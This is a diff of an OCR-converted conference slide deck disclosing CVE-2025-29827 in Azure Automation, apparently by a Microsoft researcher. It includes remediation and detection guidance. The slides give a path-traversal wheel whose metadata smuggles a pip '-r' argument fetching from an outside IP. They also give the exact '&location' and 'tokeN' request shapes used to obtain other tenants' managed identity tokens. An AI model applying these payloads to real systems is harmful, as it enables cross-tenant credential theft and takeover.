@@ -14,6 +14,8 @@ has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 89.2
 ocr_unreliable_blocks: 0
+vision_verified_pages_changed: 50
+vision_verified_pages: 50
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
 companion_files: []
@@ -33,65 +35,55 @@ converted_at: "2026-08-12T05:43:27Z"
 
 Shay Shavit
 
-1
-
 ## Slide 2
-
-**Shay Shavit** Senior Security Researcher Microsoft
 
 ###### WHOAMI
 
-2
-
-
-> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-Shay Shavit
+**Shay Shavit**
 Senior Security Researcher
 Microsoft
-WHOAMI
-black hat
-2026 2
-```
 
 ## Slide 3
 
 ## AGENDA
 
-###### **Azure Automation 101**
+**Azure Automation 101**
 
 **Methodology: what didn’t work, and why it matters**
 
 **Chaining the Flaws (CVE-2025-29827)**
 
-**Impact** & **Takeaways**
-
-3
+**Impact & Takeaways**
 
 ## Slide 4
 
 ## AZURE AUTOMATION
 
-**01** **`</>` Runbook** PowerShell / Python automation code **02 Job** Scheduled or triggered execution instance **03 Worker** Cloud sandbox or hybrid worker **Managed 04** Access token for Azure services **Identity Azure 05** Compute • Storage • Key Vault • APIs **Resources**
+**01 Runbook** PowerShell / Python automation code
 
-4
+**02 Job** Scheduled or triggered execution instance
+
+**03 Worker** Cloud sandbox or hybrid worker
+
+**04 Managed Identity** Access token for Azure services
+
+**05 Azure Resources** Compute • Storage • Key Vault • APIs
 
 ## Slide 5
 
 ###### WHY AZURE AUTOMATION
 
-**Broadly Used** Across Customers and internally
+**Broadly Used**
+Across Customers and internally
 
-Runs Code
+**Runs Code**
 PowerShell / Python
 
-Stores Secrets
+**Stores Secrets**
 Secrets / Certificates
 
-**Privileged Identity** Owner / Contributor / KeyVault Administrator
-
-5
+**Privileged Identity**
+Owner / Contributor / KeyVault Administrator
 
 ## Slide 6
 
@@ -99,149 +91,133 @@ Secrets / Certificates
 
 ###### Cross-Tenant Access
 
-6
-
 ## Slide 7
 
 ###### HOW ANSR HUNTS CHAINS
 
 **METHODOLOGY — FOLLOW THE ASSUMPTIONS ACROSS BOUNDARIES**
 
-01
-
-###### **Enumerate trust boundaries**
-
-02
-
-Chain the gaps
-
-###### **`03` Validate the fix at every link**
+**01 Enumerate trust boundaries**
 
 Every place identity, tenancy, or authorization changes hands.
 
+**02 Chain the gaps**
+
 A single bypass is rarely enough; combine primitives across boundaries.
+
+**03 Validate the fix at every link**
 
 One patch is never the fix; the assumption at every link has to change.
 
 **The rest of this talk is this methodology, applied to Azure Automation.**
 
-7
-
 ## Slide 8
 
 ## WHAT DIDN’T CHAIN
 
-2 SSRFs RCE (sandboxed)
+2 SSRFs
 
-8
+RCE (sandboxed)
 
 ## Slide 9
 
 ###### PYTHON PACKAGE RCE
 
 - You can upload python packages to your automation account.
-
-- • Upload processed in shared environment.
-
+- Upload processed in shared environment.
 - Only whl files allowed -> no dynamic code
-
-- • Let’s start digging
-
-9
+- Let’s start digging
 
 ## Slide 10
 
 ###### PYTHON PACKAGE UPLOAD
 
-01
+**01 User Uploads Whl Package**
 
-02
+**02 Package Validation**
+Shared service environment
 
-Shared service
-environment
+**03 Automation Account Package Store**
 
-03
-
-↑ ✓ ▣
-Automation
-User Uploads Package
-Account
-Whl Package Validation
-Package Store
-
-###### _The validation step is where untrusted package input crosses into service-controlled execution._
-
-10
+_The validation step is where untrusted package input crosses into service-controlled execution._
 
 ## Slide 11
 
 ###### WHAT HAPPENS INSIDE VALIDATION
 
-01 02 Trust boundary crossing 03
-↑ ≡ >_
-Read Wheel  Invoke pip
-Extract Archive
-Metadata Command
+**01 Extract Archive**
 
-###### _The risky moment is when archive-controlled metadata begins shaping service-side validation._
+**02 Read Wheel Metadata**
+Trust boundary crossing
 
-11
+**03 Invoke pip Command**
+
+_The risky moment is when archive-controlled metadata begins shaping service-side validation._
 
 ## Slide 12
 
 ###### PYTHON PACKAGE RCE
 
-\```
+```
 var pip = $"install --root {tempExtractionPath} --ignore-installed
 --no-deps --ignore-requires-python {wheelFilePath}";
-\```
+```
 
-12
+Archive path of the malicious wheel:
+
+`test.whl\.-..\..\..\..\..\..\..\Python27\Tools\Scripts\.dist-info\`
+
+| Name | Size | Packed Size | Modified | Created | Accessed | Attributes |
+|------|------|-------------|----------|---------|----------|------------|
+| METADATA | 220 | 152 | 2024-11-18 17:31 | 2024-11-18 17:10 | 2024-11-18 17:31 | A |
+| RECORD | 387 | 256 | 2024-10-31 10:55 | 2024-11-18 17:10 | 2024-11-18 17:10 | A |
+| top_level.txt | 13 | 13 | 2024-10-31 10:55 | 2024-11-18 17:10 | 2024-11-18 17:15 | A |
+| WHEEL | 117 | 111 | 2024-11-17 17:52 | 2024-11-18 17:10 | 2024-11-18 17:24 | A |
+
+WHEEL file contents:
+
+```
+Wheel-Version: 1.0
+Generator: bdist_wheel (0.37.1)
+Root-Is-Purelib: true
+Tag: r http://172.171.240.248/../../l -f-any
+```
 
 ## Slide 13
 
 ###### PYTHON PACKAGE RCE
 
-\```
+```
 pip.exe install --root C:/temp/jfdsa9rvfsd/ --ignore-installed --no-
 deps --ignore-requires-python
-\```
+C:/temp/jfdsa9rvfsd/../../../../../../../Python27/Tools/Scripts/
+-r http://172.171.240.248/../../l -f-any
+```
 
-`C:/temp/jfdsa9rvfsd/../../../../../../../Python27/Tools/Scripts/ -r http://172.171.240.248/../../l -f-any` Install This
+**Install This** (highlights the install path `C:/temp/jfdsa9rvfsd/../…/Python27/Tools/Scripts/`)
 
-Requires This
-
-13
+**Requires This** (highlights `-r http://172.171.240.248/../../l`)
 
 ## Slide 14
 
-### SANDBOX
+## SANDBOX
 
-##### We can execute code in a sandbox The sandbox can fetch Account MI token We can trick it to ask for another account MI
+We can execute code in a sandbox
 
-14
+The sandbox can fetch Account MI token
+
+We can trick it to ask for another account MI
 
 ## Slide 15
 
 ## IT DIDN’T WORK
 
-**_Methodology signal:_** _when a bug doesn't chain, ask what boundary you actually need to cross_
-
-15
-
-
-> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-LI DIDN'T WORK
-ng : An exception prevented st: . [sandboxId=583afSe-
-‘a attempted to
-Methodology signal: when a bug doesn't chain, ask what boundary
-you actually need to cross
-black hat
-USA
-2026 15
 ```
+[473660]: (283) 12/24/2024 9:50:49 AM : TraceExceptionWarning : An exception prevented … service request: … . [sandboxId=583af5e0-…
+System.UnauthorizedAccessException: The sandbox 583af5e0-…a attempted to access the account c74…5d.
+```
+
+**_Methodology signal:_** _when a bug doesn't chain, ask what boundary you actually need to cross_
 
 ## Slide 16
 
@@ -250,8 +226,6 @@ USA
 Automation Service has a way to fetch MI for all automation accounts
 
 Can we find another vector?
-
-16
 
 ## Slide 17
 
@@ -265,314 +239,268 @@ Install a vm extension, register as a worker in the account and fetch data from 
 
 Hosts communicate with a separate endpoint to enable functionality  = JRDS
 
-17
-
 ## Slide 18
 
 ###### JOB RUNTIME DATA SERVICE
 
-###### New plan! We find vulnerabilities in JRDS
+New plan!
 
-18
+We find vulnerabilities in JRDS
 
 ## Slide 19
 
 ###### JRDS ENDPOINTS
 
-###### `https://` **`{accountId}`** `.jrds.azure-automation.net`
+`https://{accountId}.jrds.azure-automation.net`
 
-**Per-account endpoint** Each Automation Account has its own JRDS hostname.
+**Per-account endpoint**
+Each Automation Account has its own JRDS hostname.
 
-###### **Public by default**
-
+**Public by default**
 Network access was allowed from the internet unless restricted.
 
-**Security implication** The authentication path became remotely reachable.
-
-19
+**Security implication**
+The authentication path became remotely reachable.
 
 ## Slide 20
 
 ###### AUTH HANDLERS
 
-\```
-HttpMessageHandler.Add(newCertificateHandler(container.Resolve<...
-HttpMessageHandler.Add(newJwtHandler(container.Resolve<...
-HttpMessageHandler.Add(newMIHandler(container.Resolve<…
-\```
+```
+HttpMessageHandler.Add(new CertificateHandler(container.Resolve<...
+HttpMessageHandler.Add(new JwtHandler(container.Resolve<...
+HttpMessageHandler.Add(new MIHandler(container.Resolve<…
+```
 
-###### **Handlers are sequential, if one fails the other try to authenticate**
-
-20
+**Handlers are sequential, if one fails the other try to authenticate**
 
 ## Slide 21
 
 ###### THREE GATES
 
-JWT Authentication
-Hybrid Worker VM JRDS request Route Handler
-Handler
-Inside the JWT Authentication Handler
-1 Validate JWT Is the token valid?
-2 Bind identity to VM Does the token match the VM?
-Is this worker associated with this
-3 Fetch worker info
-Automation Account?
-Each gate answers a different question.
+Hybrid Worker VM → JRDS request → JWT Authentication Handler → Route Handler
 
-21
+**Inside the JWT Authentication Handler**
+
+1. **Validate JWT** — Is the token valid?
+2. **Bind identity to VM** — Does the token match the VM?
+3. **Fetch worker info** — Is this worker associated with this Automation Account?
+
+_Each gate answers a different question._
 
 ## Slide 22
 
 ###### GATE 1: VALIDATE JWT
 
-JWT Authentication Handler
-JWT 1 Validate JWT
+JWT
 Managed identity token
-2
-Bind identity to VM
-3
-Fetch worker info
+
+**JWT Authentication Handler**
+
+1. Validate JWT
+2. Bind identity to VM
+3. Fetch worker info
 
 **Requirement:** present a valid managed identity JWT
-
-Managed identity token
 
 This proves the caller has **_some_** managed identity — not that it belongs to the target Automation Account.
 
 **Gate 1 verifies token validity, not account association.**
 
-22
-
 ## Slide 23
 
 ###### GATE 2: BIND IDENTITY TO VM
 
-JWT Authentication Handler REQUEST PARAMETER
-?vmResourceId={vm-controlled-by-caller}
-✓ Validate JWT PASSED
-The handler checks whether the JWT identity matches the VM
-2 Bind identity to VM
-resource ID in the request.
-Key insight  But the request supplies the VM resource ID.
-3 Fetch worker info
-==
-JWT managed identity vmResourceId identity
-Result: PASS
-Gate 2 binds the token to the VM named by the request — not yet to the Automation Account.
+**JWT Authentication Handler**
 
-23
+✓ Validate JWT — PASSED
+2. Bind identity to VM
+3. Fetch worker info
+
+**REQUEST PARAMETER**
+`?vmResourceId={vm-controlled-by-caller}`
+
+The handler checks whether the JWT identity matches the VM resource ID in the request.
+
+**Key insight** But the request supplies the VM resource ID.
+
+JWT managed identity == vmResourceId identity
+Result: PASS
+
+**Gate 2 binds the token to the VM named by the request — not yet to the Automation Account.**
 
 ## Slide 24
 
 ###### LOCATION LOCATION LOCATION
 
-\```
+```
 if (!IsLocation(request)){
-AssociateWorker();
+    AssociateWorker();
 }
-\```
+```
 
-\```
+```
 private bool IsLocation(HttpRequestMessage request)
 {
-\```
+    return request.RequestUri.AbsoluteUri.Contains(“location”);
+}
+```
 
-`return request.RequestUri.AbsoluteUri.Contains(“location”); }` Fetch association info only if **not** location request
-
-24
+Fetch association info only if **not** location request
 
 ## Slide 25
 
 ###### LOCATION LOCATION LOCATION
 
-25
+We skip associate for /location requests
 
+So it checks AbsolutePath, right?
 
-> Recovered by OCR — confidence 83/100 on the text kept, 43/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+AbsoluteUri.Contains("/location")
 
-```text
-LOCATION LOCATION LOCATION
-Pic:
-£ AbsolutePath, right?
-black hat
-2026 25
-```
+...It checks AbsolutePath, right?
 
 ## Slide 26
 
 ###### LOCATION LOCATION LOCATION
 
-\```
+```
 if (!IsLocation(request)){
-AssociateWorker();
+    AssociateWorker();
 }
-\```
+```
 
-\```
+```
 private bool IsLocation(HttpRequestMessage request)
 {
-\```
+    return request.RequestUri.AbsoluteUri.Contains(“location”);
+}
+```
 
-`return request.RequestUri.AbsoluteUri.Contains(“location”); }` Fetch association info only if **not** location request AbsoluteUri includes query parameters... Appending &locations bypass the association check.
+Fetch association info only if **not** location request
 
-26
+AbsoluteUri includes query parameters...
+Appending &locations bypass the association check.
 
 ## Slide 27
 
 ###### GATE 3: FETCH WORKER INFO
 
-JWT Authentication Handler
-✓ Validate JWT PASSED
-✓ Bind identity to VM PASSED
-GATE 3 EFFECTIVE RESULT
-Association check
-Fetch worker info
-3 Worker must be associated with  BYPASSED
-requested Automation Account
-BYPASSED
-GET /automationAccounts/{targetAccount}/action? &location
+**JWT Authentication Handler**
 
-27
+✓ Validate JWT — PASSED
+✓ Bind identity to VM — PASSED
+3. Fetch worker info — Worker must be associated with requested Automation Account — BYPASSED
+
+**GATE 3 EFFECTIVE RESULT**
+
+~~Association check~~ → BYPASSED
+
+```
+GET /automationAccounts/{targetAccount}/action?&location
+```
 
 ## Slide 28
 
 ###### BYPASS SUMMARY
 
-1
+**1 Valid JWT** — Any managed identity token
 
-Valid JWT
+**2 Matching vmResourceId** — Request-controlled VM reference
 
-Any managed identity token
+**3 Worker lookup bypass** — Association check skipped via query manipulation
 
-2
+**! Request reaches Route Handler** — Unauthorized path
 
-3
+The first two gates validate identity shape; the third gate was supposed to enforce **Automation Account scope.**
 
-!
-
-Matching  Worker lookup  Request reaches Route
-vmResourceId
-bypass Handler
-Request-controlled VM  Association check  Unauthorized path
-reference skipped via query
-manipulation
-
-###### The first two gates validate identity shape; the third gate was supposed to enforce **Automation Account scope.**
-
-###### `GET /automationAccounts/{targetAccount}/action?` **`vmResourceId={vm}&location`**
-
-28
+```
+GET /automationAccounts/{targetAccount}/action?vmResourceId={vm}&location
+```
 
 ## Slide 29
 
 ###### WHAT THE BYPASS EXPOSED
 
-Once the association check is **bypassed** , the attacker can **access everything below** .
+Once the association check is **bypassed**, the attacker can **access everything below**.
 
-**Certificates** signing material, auth material, service credentials
+**Certificates**
+signing material, auth material, service credentials
 
-**Secrets Notebook content** stored automation secrets and protected automation logic, scripts, operational values context
+**Secrets**
+stored automation secrets and protected values
 
-Job results
+**Notebook content**
+automation logic, scripts, operational context
 
+**Job results**
 execution output, errors, environment details
-
-29
 
 ## Slide 30
 
 ###### MANAGED IDENTITY TIME
 
 - Automation account create a managed identity on RP registration; all accounts have a managed identity.
-
 - This is the secure way for automation to perform its defined tasks.
-
-- • Notebook fetch MI token -> perform actions on Azure tenant.
-
+- Notebook fetch MI token -> perform actions on Azure tenant.
 - Most of the time the MI have a very privileged role: Contributor, Owner, etc..
-
-30
 
 ## Slide 31
 
 ###### LOCATION?
 
 - I Have authorization bypass -> fetch MI token
-
-- • token is generated by
-
+- token is generated by
    - GET /automationAccounts/{accountID}/oauth2/token
-
-   - • No association check
-
+   - No association check
 - Issued request -> got 403 Forbidden
-
-- • Why?
-
-31
+- Why?
 
 ## Slide 32
 
 ###### DIFFERENT AUTH HANDLER
 
-\```
-HttpMessageHandler.Add(newCertificateHandler(container.Resolve<...
-HttpMessageHandler.Add(newJwtHandler(container.Resolve<...
-HttpMessageHandler.Add(newMIHandler(container.Resolve<…
-\```
+```
+HttpMessageHandler.Add(new CertificateHandler(container.Resolve<...
+HttpMessageHandler.Add(new JwtHandler(container.Resolve<...
+HttpMessageHandler.Add(new MIHandler(container.Resolve<…
+```
 
-###### **Another handler authorize MI tokens**
-
-32
+**Another handler authorize MI tokens**
 
 ## Slide 33
 
 ###### ISMIREQUEST()
 
-\```
+```
 if (IsMIRequest(request.uri))
 {
-\```
-
-\```
     // Skip Auth Token based authentication
-return base.Send(request);
+    return base.Send(request);
 }
-\```
+```
 
-\```
-public staticboolIsMIRequest(Uri uri)
+```
+public static bool IsMIRequest(Uri uri)
 {
-\```
-
-\```
-string guid = @”…”;
+    string guid = @”…”;
     Regex regex = new Regex($"/automationAccounts/{guid}/oauth2/token");
     Match match = regex.Match(uri.AbsolutePath);
-return match.Success;
+    return match.Success;
 }
-\```
+```
 
-###### From JwtHandler
-
-33
+From JwtHandler
 
 ## Slide 34
 
 ## MI HANDLER
 
 - Requires a per account secret present in automation account
-
 - Don’t have the secret
-
 - Couldn’t obtain the secret
-
    - Isn’t stored in the automation account “secrets” accessible via the previous &location chain
-
 - Couldn’t bypass the handler logic
-
-34
 
 ## Slide 35
 
@@ -580,137 +508,120 @@ return match.Success;
 
 **But “Handlers are sequential, if one fails the next try to authenticate”**
 
-JWTHalder executes before MIHandler. We can bypass JWT. Can we force the use of JWTHandler?
-
-35
+JWTHalder executes before MIHandler.
+We can bypass JWT.
+Can we force the use of JWTHandler?
 
 ## Slide 36
 
 ###### ISMIREQUEST()
 
-\```
+```
 if (IsMIRequest(request.uri))
 {
-\```
-
-\```
     // We Skip Auth Token based authentication
-return base.Send(request);
+    return base.Send(request);
 }
-\```
+```
 
-\```
-public staticboolIsMIRequest(Uri uri)
+```
+public static bool IsMIRequest(Uri uri)
 {
-\```
-
-\```
-string guid = @”…”;
+    string guid = @”…”;
     Regex regex = new Regex($"/automationAccounts/{guid}/oauth2/token");
     Match match = regex.Match(uri.AbsolutePath);
-return match.Success;
+    return match.Success;
 }
-\```
+```
 
-###### From JwtHandler
-
-36
+From JwtHandler
 
 ## Slide 37
 
 ###### ONE CHARACTER. OPPOSITE OUTCOME.
 
-###### **THE LAST CHARACTER CHANGES THE AUTH PATH**
+**THE LAST CHARACTER CHANGES THE AUTH PATH**
 
-**LOWERCASE**
-
-**UPPERCASE**
-
-≠
-n
-
-# **N**
+**LOWERCASE** n  ≠  **UPPERCASE** N
 
 **CASE-SENSITIVE MATCH**
 
-**403** `GET /automationAccounts/{accountID}/oauth2/toke` **`n`**
+**403** `GET /automationAccounts/{accountID}/oauth2/token` **AUTH RUNS**
 
-**AUTH RUNS**
-
-**200** `GET /automationAccounts/{accountID}/oauth2/toke` **`N`**
-
-**AUTH SKIPPED**
+**200** `GET /automationAccounts/{accountID}/oauth2/tokeN` **AUTH SKIPPED**
 
 **The endpoint is the same. The casing decides whether authentication executes.**
-
-37
 
 ## Slide 38
 
 ###### SAME ENDPOINT, DIFFERENT HANDLER PATH
 
-/oauth2/token → 403
+**/oauth2/token → 403**
 
-/oauth2/tokeN → 200
+- Request: /oauth2/token
+- JWT Handler — Recognizes MI token route
+- MI Token Handler — Requires MSI-specific auth context
+- DENIED — 403
 
-Request Request
-/oauth2/token /oauth2/tokeN
-JWT Handler JWT Handler
-Recognizes MI token route JWT auth succeeds
-MI Token Handler MI Token Handler
-Requires MSI-specific auth context Skipped
-DENIED Router / Controller
-403 Case-insensitive route match
-TOKEN ISSUED
-200
+**/oauth2/tokeN → 200**
 
-###### _Handler matching was case-sensitive; controller routing was not._
+- Request: /oauth2/tokeN
+- JWT Handler — JWT auth succeeds
+- MI Token Handler — Skipped
+- Router / Controller — Case-insensitive route match
+- TOKEN ISSUED — 200
 
-38
+_Handler matching was case-sensitive; controller routing was not._
 
 ## Slide 39
 
 ###### CHAINING THE PIECES
 
-###### **CVE-2025-29827 (CVSS 9.9)**
+**CVE-2025-29827 (CVSS 9.9)**
 
-**T H R E E I N G R E D I E N T S**
+**THREE INGREDIENTS**
 
 **1 BAD DEFAULT** Automation Accounts are public by default
 
-- **2 VULNERABILITY #1** &location bypasses worker association
+**2 VULNERABILITY #1** &location bypasses worker association
 
 **3 VULNERABILITY #2** tokeN reaches the token controller through handler mismatch
 
 Chained together
 
-###### **H I G H - I M P A C T R E S U L T**
+**HIGH-IMPACT RESULT**
 
 **Cross-tenant managed identity takeover**
 
-Access to public Automation Accounts Tokens for managed identities Tenant resources reachable through assigned roles
+Access to public Automation Accounts
 
-39
+Tokens for managed identities
+
+Tenant resources reachable through assigned roles
 
 ## Slide 40
 
-**1/7**
-
 ###### 1. LEGITIMATE STARTING POINT
 
-AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
-Attacker Automation Account JRDS endpoint Victim Automation Account
-JWT Authentication Handler Victim Managed Identity
-Attacker Hybrid Worker VM
-Tenant resources
-Worker association check
-Attacker Managed Identity Key Vault Storage
-Token route / controller
-VMs Subscriptions
+**1/7**
 
-###### The attacker starts with a legitimate Automation Account, VM, and managed identity.
+**ATTACKER TENANT**
+- Attacker Automation Account
+- Attacker Hybrid Worker VM
+- Attacker Managed Identity
 
-40
+**AZURE AUTOMATION / JRDS**
+- JRDS endpoint
+- JWT Authentication Handler
+- Worker association check
+- Token route / controller
+
+**VICTIM TENANT**
+- Victim Automation Account
+- Victim Managed Identity
+- Tenant resources: Key Vault, Storage, VMs, Subscriptions
+
+The attacker starts with a legitimate Automation Account, VM, and managed identity.
 
 ## Slide 41
 
@@ -718,216 +629,239 @@ VMs Subscriptions
 
 **2/7**
 
-AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
-Attacker Automation Account JRDS endpoint Victim Automation Account
-Automation Accounts are public by default.
-JWT Authentication Handler Victim Managed Identity
-Attacker Hybrid Worker VM
-Tenant resources
-Worker association check
-Attacker Managed Identity Key Vault Storage
-Token route / controller
-VMs Subscriptions
+**ATTACKER TENANT**
+- Attacker Automation Account
+- Attacker Hybrid Worker VM
+- Attacker Managed Identity
+
+**AZURE AUTOMATION / JRDS**
+- JRDS endpoint
+- JWT Authentication Handler
+- Worker association check
+- Token route / controller
+
+**VICTIM TENANT**
+- Victim Automation Account — Automation Accounts are public by default.
+- Victim Managed Identity
+- Tenant resources: Key Vault, Storage, VMs, Subscriptions
 
 Public reachability gives the attacker a path to the JRDS endpoint.
 
-41
-
 ## Slide 42
-
-**3/7**
 
 ###### 3. CROSS-ACCOUNT JRDS REQUEST
 
-AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
-Attacker Automation Account JRDS endpoint Victim Automation Account
-JWT Authentication Handler Victim Managed Identity
-Attacker Hybrid Worker VM
-Tenant resources
-Worker association check
-Attacker Managed Identity Key Vault Storage
-Token route / controller
-VMs Subscriptions
+**3/7**
+
+**ATTACKER TENANT**
+- Attacker Automation Account
+- Attacker Hybrid Worker VM
+- Attacker Managed Identity
+
+**AZURE AUTOMATION / JRDS**
+- JRDS endpoint
+- JWT Authentication Handler
+- Worker association check
+- Token route / controller
+
+**VICTIM TENANT**
+- Victim Automation Account
+- Victim Managed Identity
+- Tenant resources: Key Vault, Storage, VMs, Subscriptions
+
+```
 GET /automationAccounts/{victimAccount}/.../?vmResourceId={attackerVm}
+```
 
 The request targets the victim account while carrying attacker-controlled VM context.
 
-42
-
 ## Slide 43
-
-**4/7**
 
 ###### 4. FIRST CHECKS PASS
 
-AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
-Attacker Automation Account JRDS endpoint Victim Automation Account
-JWT Authentication Handler Victim Managed Identity
-Attacker Hybrid Worker VM ✓  Valid JWT
-✓  JWT identity matches vmResourceId
-Tenant resources
-Worker association check
-Attacker Managed Identity Key Vault Storage
-Token route / controller
-VMs Subscriptions
+**4/7**
+
+**ATTACKER TENANT**
+- Attacker Automation Account
+- Attacker Hybrid Worker VM
+- Attacker Managed Identity
+
+**AZURE AUTOMATION / JRDS**
+- JRDS endpoint
+- JWT Authentication Handler
+  - ✓ Valid JWT
+  - ✓ JWT identity matches vmResourceId
+- Worker association check
+- Token route / controller
+
+**VICTIM TENANT**
+- Victim Automation Account
+- Victim Managed Identity
+- Tenant resources: Key Vault, Storage, VMs, Subscriptions
+
+```
 GET /automationAccounts/{victimAccount}/.../?vmResourceId={attackerVm}
+```
 
 The first checks validate the attacker’s identity shape, not the victim account scope.
 
-43
-
 ## Slide 44
-
-**5/7**
 
 ###### 5. ASSOCIATION CHECK BYPASS
 
-AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
-Attacker Automation Account JRDS endpoint Victim Automation Account
-JWT Authentication Handler Victim Managed Identity
-Attacker Hybrid Worker VM
-B Y PAS S E D
-Tenant resources
-Worker association check
-Attacker Managed Identity Key Vault Storage
-Token route / controller
-VMs Subscriptions
-GET /automationAccounts/{victimAccount}/...?vmResourceId={attackerVm} &location
+**5/7**
+
+**ATTACKER TENANT**
+- Attacker Automation Account
+- Attacker Hybrid Worker VM
+- Attacker Managed Identity
+
+**AZURE AUTOMATION / JRDS**
+- JRDS endpoint
+- JWT Authentication Handler
+- Worker association check — BYPASSED
+- Token route / controller
+
+**VICTIM TENANT**
+- Victim Automation Account
+- Victim Managed Identity
+- Tenant resources: Key Vault, Storage, VMs, Subscriptions
+
+```
+GET /automationAccounts/{victimAccount}/...?vmResourceId={attackerVm}&location
+```
 
 Query manipulation bypasses the worker-to-account association check.
 
-44
-
 ## Slide 45
-
-**6/7**
 
 ###### 6. TOKEN ROUTE MISMATCH
 
-AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
-Attacker Automation Account JRDS endpoint Victim Automation Account
-JWT Authentication Handler Victim Managed Identity
-Attacker Hybrid Worker VM
-Tenant resources
-Worker association check
-Attacker Managed Identity Key Vault Storage
-M I S M AT C H
-Token route / controller
-VMs Subscriptions
-GET .../oauth2/ tokeN?vmResourceId={attackerVm}&location
-Handler matching and controller routing disagree.
-The request reaches the token-generation path.
+**6/7**
 
-45
+**ATTACKER TENANT**
+- Attacker Automation Account
+- Attacker Hybrid Worker VM
+- Attacker Managed Identity
+
+**AZURE AUTOMATION / JRDS**
+- JRDS endpoint
+- JWT Authentication Handler
+- Worker association check
+- Token route / controller — MISMATCH
+
+**VICTIM TENANT**
+- Victim Automation Account
+- Victim Managed Identity
+- Tenant resources: Key Vault, Storage, VMs, Subscriptions
+
+```
+GET .../oauth2/tokeN?vmResourceId={attackerVm}&location
+```
+
+Handler matching and controller routing disagree.
+
+The request reaches the token-generation path.
 
 ## Slide 46
 
 ###### 7. VICTIM IDENTITY OBTAINED
 
-###### **7/7**
+**7/7**
 
-AT TA C K E R T E N A N T A Z U R E A U T O M AT I O N / J R D S V I C T I M T E N A N T
-Attacker Automation Account JRDS endpoint Victim Automation Account
-TO K E N O B TAI N E D
-JWT Authentication Handler Victim Managed Identity
-Victim Automation Account Managed Identity
-Attacker Hybrid Worker VM
-Tenant resources
-Worker association check
-Attacker Managed Identity Key Vault Storage
-Token route / controller
-VMs Subscriptions
+**ATTACKER TENANT**
+- Attacker Automation Account
+- Attacker Hybrid Worker VM
+- Attacker Managed Identity
+
+**AZURE AUTOMATION / JRDS**
+- JRDS endpoint
+- JWT Authentication Handler
+- Worker association check
+- Token route / controller
+
+**VICTIM TENANT**
+- Victim Automation Account
+- **TOKEN OBTAINED** — Victim Automation Account Managed Identity
+- Tenant resources: Key Vault, Storage, VMs, Subscriptions
 
 The attacker can act through the victim Automation Account’s managed identity and its assigned roles.
-
-46
 
 ## Slide 47
 
 ###### BREAKING THE CHAIN
 
-**R E M E D I AT I O N — R E M O V E T H E U N S AF E AS S U M P T I O N AT E AC H L I N K**
+**REMEDIATION — REMOVE THE UNSAFE ASSUMPTION AT EACH LINK**
 
 CHAIN BROKEN
-LINK 1 LINK 2 LINK 3 LINK 4
-WEAK POINT WEAK POINT WEAK POINT WEAK POINT
-Public exposure Worker association Handler mismatch Token issuance
-FIX FIX FIX FIX
-Guidance to enable private  Normalize and strictly  Make handler routing and  Re-validate authorization at
-endpoint validate request parameters  controller routing agree the token-generation
-before lookup boundary
 
-###### **The fix was not one patch — it was removing every unsafe assumption in the chain.**
+**LINK 1**
+WEAK POINT: Public exposure
+FIX: Guidance to enable private endpoint
 
-47
+**LINK 2**
+WEAK POINT: Worker association
+FIX: Normalize and strictly validate request parameters before lookup
+
+**LINK 3**
+WEAK POINT: Handler mismatch
+FIX: Make handler routing and controller routing agree
+
+**LINK 4**
+WEAK POINT: Token issuance
+FIX: Re-validate authorization at the token-generation boundary
+
+**The fix was not one patch — it was removing every unsafe assumption in the chain.**
 
 ## Slide 48
 
 ###### DETECTING THE CHAIN IN FLIGHT
 
-###### **DETECTION — CORRELATE TENANT, URI, AND WORKER ASSOCIATION**
+**DETECTION — CORRELATE TENANT, URI, AND WORKER ASSOCIATION**
 
-###### **`01`**
+**01 Anomalous JRDS access**
 
-###### **Anomalous JRDS access**
-
-###### **WHAT TO LOOK FOR**
-
+**WHAT TO LOOK FOR**
 JRDS calls where the caller's tenant ≠ the target Automation Account's tenant.
 
 **WHY IT FIRES**
+Cross-tenant hybrid worker registration is not a legitimate pattern.
 
-**Cross-tenant hybrid worker registration is not a legitimate pattern.**
+**02 Suspicious query shape on token endpoints**
 
-\```
-02
-\```
-
-###### **Suspicious query shape on token endpoints**
-
-###### **WHAT TO LOOK FOR**
-
+**WHAT TO LOOK FOR**
 Requests to /automationAccounts/*/oauth2/token* containing &location, mixed casing (tokenN, Token), or trailing characters.
 
 **WHY IT FIRES**
+Both bypass primitives in this chain are visible at the URI layer.
 
-**Both bypass primitives in this chain are visible at the URI layer.**
+**03 Managed-identity issuance without worker association**
 
-\```
-03
-\```
-
-###### **Managed-identity issuance without worker association**
-
-###### **WHAT TO LOOK FOR**
-
+**WHAT TO LOOK FOR**
 MI tokens issued to callers not registered as a hybrid worker for that account.
 
 **WHY IT FIRES**
+This is the takeover moment — if you catch nothing else, catch this.
 
-**This is the takeover moment — if you catch nothing else, catch this.**
-
-###### **You don't need to catch the bug — you need to catch the pattern.**
-
-48
+**You don't need to catch the bug — you need to catch the pattern.**
 
 ## Slide 49
 
 ###### FINAL TAKEAWAYS
 
-**W H AT TO R E M E M B E R W H E N Y O U WAL K O U T**
+**WHAT TO REMEMBER WHEN YOU WALK OUT**
 
-###### **Chained flaws**
+**Chained flaws**
 
-**1 default + 1 routing bug + 1 regex bug = cross-tenant identity takeover.**
+1 default + 1 routing bug + 1 regex bug = cross-tenant identity takeover.
 
-**Mitigate cross-tenant identity abuse Private-by-default + canonical routing + authorize at every boundary.**
+**Mitigate cross-tenant identity abuse**
+Private-by-default + canonical routing + authorize at every boundary.
 
-**A methodology for multi-tenant threat modeling Enumerate trust boundaries → attack each gate → chain the gaps → validate the fix at every link.**
+**A methodology for multi-tenant threat modeling**
+Enumerate trust boundaries → attack each gate → chain the gaps → validate the fix at every link.
 
-###### **Cloud isolation is only as strong as the assumptions between services.**
-
-49
